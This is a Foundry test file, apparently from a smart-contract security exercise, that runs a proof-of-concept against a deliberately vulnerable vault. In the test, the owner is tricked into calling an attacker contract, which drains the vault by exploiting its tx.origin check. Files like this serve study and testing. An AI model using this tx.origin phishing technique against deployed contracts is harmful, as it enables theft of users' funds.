// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/vulnerable/access-control/BadModifierVault.sol";
import "../src/attacker/access-control/TXOriginByPassAttack.sol";

contract BadModifierPoCTest is Test{
  BadModifierVault vault;
  TXOriginByPassAttack attackerContract;

  address ownerEOA = address(0xA);
  address attackerEOA = address(0xB);
  function setUp() public {
    vm.deal(ownerEOA, 100 ether);
    vm.deal(attackerEOA, 1 ether);
    // Owner deploys Vault with funds
    vm.startPrank(ownerEOA);
    vault = new BadModifierVault{value: 50 ether}();
    vm.stopPrank();

    // Attacker deploys attacker contract
    vm.startPrank(attackerEOA);
    attackerContract = new TXOriginByPassAttack(address(vault));
    vm.stopPrank();
  }

  function test_TXOringinBypassExploit() public {
    uint256 vaultBalanceBefore = address(vault).balance;

    // Owner is tricked into calling the attcker contract
    vm.prank(ownerEOA);
    attackerContract.exploit();

    uint256 vaultBalanceAfter = address(vault).balance;
    uint256 attackerContractBalanceAfter = address(attackerContract).balance;

    console.log("Vault before:", vaultBalanceBefore);
    console.log("Vault after:", vaultBalanceAfter);
    console.log("Attacker contract balance afetr:", attackerContractBalanceAfter);

    assertEq(vaultBalanceAfter, 0);
    // assertGt(attackerContactBalanceAfter, attackerContractBalanceBefore);
    assertGt(attackerContractBalanceAfter, 0);
  }

}
